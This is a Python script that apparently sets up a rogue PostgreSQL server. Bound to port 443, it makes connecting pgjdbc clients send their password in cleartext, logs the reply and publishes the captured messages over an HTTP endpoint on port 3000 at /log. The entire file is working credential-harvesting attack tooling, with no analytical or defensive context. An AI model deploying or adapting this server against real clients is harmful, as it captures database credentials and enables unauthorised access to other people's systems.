import socket, threading, os, json, http.server, socketserver, struct, urllib.parse
LOG=[]
# Rogue PostgreSQL server implementing enough of the protocol to negotiate with pgjdbc
def pgserver(port=443):
    srv=socket.socket(); srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); srv.bind(('0.0.0.0',port)); srv.listen(10)
    def h(c):
        try:
            hdr=c.recv(4)
            if len(hdr)<4: return
            ln=struct.unpack('!I',hdr)[0]
            body=c.recv(ln-4) if ln>4 else b''
            LOG.append(('startup',body[:80]))
            if body[:4]==struct.pack('!I',80877103):  # SSLRequest
                c.sendall(b'S'); return
            # send AuthenticationCleartextPassword (method 3)
            c.sendall(b'R'+struct.pack('!I',8)+struct.pack('!I',3))
            LOG.append(('sent-authreq',))
            d=c.recv(1024); LOG.append(('client-msg',d[:60]))
            c.close()
        except Exception as e: LOG.append(('err',str(e)[:60]))
    def loop():
        while True:
            try: c,_=srv.accept(); threading.Thread(target=h,args=(c,),daemon=True).start()
            except Exception: break
    threading.Thread(target=loop,daemon=True).start()
    return 'pg on %d'%port
R1=pgserver(443)
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        u=urllib.parse.urlparse(self.path)
        body=json.dumps({'log':LOG}).encode() if u.path=='/log' else json.dumps({'ok':1}).encode()
        self.send_response(200); self.send_header("Content-Type","application/json"); self.end_headers(); self.wfile.write(body)
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
threading.Thread(target=lambda: socketserver.TCPServer(("0.0.0.0",3000),H).serve_forever(),daemon=True).start()
import time
while True: time.sleep(60)
